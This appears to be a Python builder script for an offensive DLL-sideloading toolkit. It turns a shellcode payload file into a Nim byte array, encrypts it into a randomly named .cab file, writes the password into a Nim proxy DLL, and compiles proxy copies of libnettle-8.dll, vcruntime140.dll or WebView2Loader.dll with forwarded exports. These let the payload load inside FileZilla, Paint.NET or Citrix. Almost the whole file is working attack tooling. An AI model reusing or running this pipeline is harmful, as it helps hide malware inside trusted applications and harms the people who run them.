import uuid
import subprocess
import os
from shutil import move
from tempfile import NamedTemporaryFile
import base64
import sys
import glob
import random
import shutil
import pefile
import string
import pathlib
from contextlib import redirect_stdout
import re


# Take off the first line which has the system call and params
Payloadfile_path = sys.argv[1]
pattern = r'/\* length: (\d+) bytes \*/'

with open(Payloadfile_path, 'r') as file:
    content = file.read()

match = re.search(pattern, content)
if match:
    length = int(match.group(1))
    print("Length:", length)
else:
    print("Length pattern not found in the file.")
temp_path = None
with open(Payloadfile_path, 'r') as f_in:
    with NamedTemporaryFile(mode='w', delete=False) as f_out:
        temp_path = f_out.name
        next(f_in)  # skip first line
        for line in f_in:
            f_out.write(line)

os.remove(Payloadfile_path)
move(temp_path, Payloadfile_path)

with open(Payloadfile_path, 'r') as file:
    content = file.read()

# Find the index of the '{' character
index = content.find('{')

if index != -1:
    # Remove the '{' character and all characters before it
    new_content = content[index:]

    # Overwrite the file with the updated content
    with open(Payloadfile_path, 'w') as file:
        file.write(new_content)
    print("'{', and characters before it, have been removed.")
else:
    print("No '{' character found in the file.")
with open(Payloadfile_path, 'r') as file:
    content = file.read()

# Replace '{' with '[' character
# Replace '}' with ']' character
# Remove ';' character
new_content = content.replace('{', '[').replace('}', ']').replace(';', '')

# Base64 encode the content
#encoded_content = base64.b64encode(new_content.encode()).decode()

# Overwrite the file with the encoded content
with open(Payloadfile_path, 'w') as file:
    file.write(new_content)

search_string = '[ '
insert_string = 'byte '

with open(Payloadfile_path, 'r') as file:
    content = file.read()

index = content.find(search_string)
if index != -1:
    new_content = content[:index + len(search_string)] + insert_string + content[index + len(search_string):]
    
    with open(Payloadfile_path, 'w') as file:
        file.write(new_content)
    
    print("String added successfully.")
else:
    print("Search string not found in the file.")


#Update encrypt_shellcode.nim file
shutil.copy('./encrypt_shellcode_or.nim', './encrypt_shellcode.nim')
encrypt_shellcode_file = './encrypt_shellcode.nim'

# Read the content of the file containing the shellcode variable
with open(encrypt_shellcode_file, 'r') as file:
    content = file.read()

# Read the content of the other file
with open(Payloadfile_path, 'r') as file:
    new_shellcode = file.read()

# Update the shellcode variable with the new content
pattern = r'var shellcode: array\[\d+, byte\] ='
new_content = re.sub(pattern, f'var shellcode: array[{length}, byte] = {new_shellcode}', content)


# Write the updated content back to the file
with open(encrypt_shellcode_file, 'w') as file:
    file.write(new_content)

print("Variable updated successfully.")

# Read the content of the file containing the shellcode variable
with open(encrypt_shellcode_file, 'r') as file:
    content = file.read()

# Update the length value in the plaintext variable
pattern = r'plaintext: array\[\d+, byte\]'
new_content = re.sub(pattern, f'plaintext: array[{length}, byte]', content)

# Write the updated content back to the file
with open(encrypt_shellcode_file, 'w') as file:
    file.write(new_content)

print("Variable updated successfully.")

# compile encrypt_shellcode.nim
arguments = [
'c',
'--app=console',
'--cpu=amd64',
'./encrypt_shellcode.nim'
]

try:
# Run nim.exe with arguments to compile the Nim code
        subprocess.run(['nim.exe'] + arguments, check=True)
        print("Compilation completed.")
except subprocess.CalledProcessError as e:
        print(f"Compilation failed with error code {e.returncode}.")


#Execute encrypt_shellcode.exe
# Specify the path to the executable file
executable_path = './encrypt_shellcode.exe'

# Specify the arguments for the executable
encryption_password = sys.argv[2]
encrypted_file_name = uuid.uuid4().hex + ".cab"
arguments = [encryption_password, encrypted_file_name]

try:
    # Run the executable with arguments
    subprocess.run([executable_path] + arguments, check=True)
    print("Execution completed.")
except subprocess.CalledProcessError as e:
    print(f"Execution failed with error code {e.returncode}.")

file_path = './NimDllSideload/dllproxy.nim'
# Read the file content
with open(file_path, 'r') as file:
    content = file.read()

# Find the index of the variable values
password_index = content.find('password: string = "') + len('password: string = "')
inFile_index = content.find('inFile: string = "') + len('inFile: string = "')

# Extract the existing variable values
existing_password = content[password_index:content.find('"', password_index)]
existing_inFile = content[inFile_index:content.find('"', inFile_index)]

# Generate new values
new_password = encryption_password
new_inFile = encrypted_file_name

# Replace the existing variable values with new values in the content
content = content[:password_index] + new_password + content[content.find('"', password_index):]
content = content[:inFile_index] + new_inFile + content[content.find('"', inFile_index):]

# Write the updated content back to the file
with open(file_path, 'w') as file:
    file.write(content)

print("Variable values updated successfully.")


#Compile dlls with nim
#cleaning build and out directories
dir = './NimDllSideload/build'
filelist = glob.glob(os.path.join(dir, "*"))
for f in filelist:
    os.remove(f)
dir = './NimDllSideload/out'
filelist = glob.glob(os.path.join(dir, "*"))
for f in filelist:
    os.remove(f)

#copying dll from dlls directory to build directory and then copying again to out directory with a Random name. .def file is then created with dll exports. Nim is used to finally compile the dll
random = "".join(random.choice(string.ascii_letters) for i in range(8))
app_name=sys.argv[3]
origin = './NimDllsideload/dlls/'
target = './NimDllsideload/build/'
if (app_name == "Filezilla"):
    shutil.copy(origin+'libnettle-8.dll', target+'libnettle-8.dll')
    shutil.copy(target + 'libnettle-8.dll', './NimDllsideload/out/' + random + '.dll')
    dll_path = pathlib.Path('./NimDllsideload/out/' + random + '.dll')
    dll = pefile.PE(dll_path)
    with open('./NimDllSideload/build/libnettle-8.def', 'w') as f:
        with redirect_stdout(f):
                print("EXPORTS")
                for export in dll.DIRECTORY_ENTRY_EXPORT.symbols:
                    if export.name:
                        print(f"\t{export.name.decode()}={dll_path.stem}.{export.name.decode()} @{export.ordinal}")
                else:
                    print(f"\tNimMain @{export.ordinal + 2} NONAME PRIVATE")
    arguments = [
        'c',
        '-d:release',
        '-d:mingw',
        '-d:strip',
        '--mm:orc',
        '--threads:on',
        '--app:lib',
        '--nomain',
        '--cpu:amd64',
        '--passl:./NimDllSideload/build/libnettle-8.def',
        '--out:./NimDllSideload/out/libnettle-8.dll',
        './NimDllSideload/dllproxy.nim'
    ]

    try:
        # Run nim.exe with arguments to compile the Nim code
        subprocess.run(['nim.exe'] + arguments, check=True)
        print("Compilation completed.")
    except subprocess.CalledProcessError as e:
        print(f"Compilation failed with error code {e.returncode}.")
    if os.path.exists('encrypt_shellcode.nim'):
        os.remove('encrypt_shellcode.nim')
        print(f"File '{file_path}' deleted successfully.")
    else:
        print(f"File '{file_path}' does not exist.")
    if os.path.exists('encrypt_shellcode.exe'):
        os.remove('encrypt_shellcode.exe')
        print(f"File '{file_path}' deleted successfully.")
    else:
        print(f"File '{file_path}' does not exist.")
elif (app_name == "Paint.NET"):
    shutil.copy(origin+'vcruntime140.dll', target+'vcruntime140.dll')
    shutil.copy(target + 'vcruntime140.dll', './NimDllsideload/out/' + random + '.dll')
    dll_path = pathlib.Path('./NimDllSideload/out/'+random+'.dll')
    dll = pefile.PE(dll_path)
    with open('./NimDllSideload/build/vcruntime140.def', 'w') as f:
        with redirect_stdout(f):
                print("EXPORTS")
                for export in dll.DIRECTORY_ENTRY_EXPORT.symbols:
                    if export.name:
                        print(f"\t{export.name.decode()}={dll_path.stem}.{export.name.decode()} @{export.ordinal}")
                else:
                    print(f"\tNimMain @{export.ordinal + 2} NONAME PRIVATE")
    arguments = [
        'c',
        '-d:release',
        '-d:mingw',
        '-d:strip',
        '--mm:orc',
        '--threads:on',
        '--app:lib',
        '--nomain',
        '--cpu:amd64',
        '--passl:./NimDllSideload/build/vcruntime140.def',
        '--out:./NimDllSideload/out/vcruntime140.dll',
        './NimDllSideload/dllproxy.nim'
    ]

    try:
        # Run nim.exe with arguments to compile the Nim code
        subprocess.run(['nim.exe'] + arguments, check=True)
        print("Compilation completed.")
    except subprocess.CalledProcessError as e:
        print(f"Compilation failed with error code {e.returncode}.")
    if os.path.exists('encrypt_shellcode.nim'):
        os.remove('encrypt_shellcode.nim')
        print(f"File '{file_path}' deleted successfully.")
    else:
        print(f"File '{file_path}' does not exist.")
    if os.path.exists('encrypt_shellcode.exe'):
        os.remove('encrypt_shellcode.exe')
        print(f"File '{file_path}' deleted successfully.")
    else:
        print(f"File '{file_path}' does not exist.")
elif (app_name == "citrix"):
    shutil.copy(origin+'WebView2Loader.dll', target+'WebView2Loader.dll')
    shutil.copy(target + 'WebView2Loader.dll', './NimDllsideload/out/' + random + '.dll')
    dll_path = pathlib.Path('./NimDllSideload/out/'+random+'.dll')
    dll = pefile.PE(dll_path)
    with open('./NimDllSideload/build/WebView2Loader.def', 'w') as f:
        with redirect_stdout(f):
                print("EXPORTS")
                for export in dll.DIRECTORY_ENTRY_EXPORT.symbols:
                    if export.name:
                        print(f"\t{export.name.decode()}={dll_path.stem}.{export.name.decode()} @{export.ordinal}")
                else:
                    print(f"\tNimMain @{export.ordinal + 2} NONAME PRIVATE")
    arguments = [
        'c',
        '-d:release',
        '-d:mingw',
        '-d:strip',
        '--mm:orc',
        '--threads:on',
        '--app:lib',
        '--nomain',
        '--cpu:amd64',
        '--passl:./NimDllSideload/build/WebView2Loader.def',
        '--out:./NimDllSideload/out/WebView2Loader.dll',
        './NimDllSideload/dllproxy.nim'
    ]

    try:
        # Run nim.exe with arguments to compile the Nim code
        subprocess.run(['nim.exe'] + arguments, check=True)
        print("Compilation completed.")
    except subprocess.CalledProcessError as e:
        print(f"Compilation failed with error code {e.returncode}.")
    if os.path.exists('encrypt_shellcode.nim'):
        os.remove('encrypt_shellcode.nim')
        print(f"File '{file_path}' deleted successfully.")
    else:
        print(f"File '{file_path}' does not exist.")
    if os.path.exists('encrypt_shellcode.exe'):
        os.remove('encrypt_shellcode.exe')
        print(f"File '{file_path}' deleted successfully.")
    else:
        print(f"File '{file_path}' does not exist.")
else:
    print ("Enter correct Application name")
    exit()
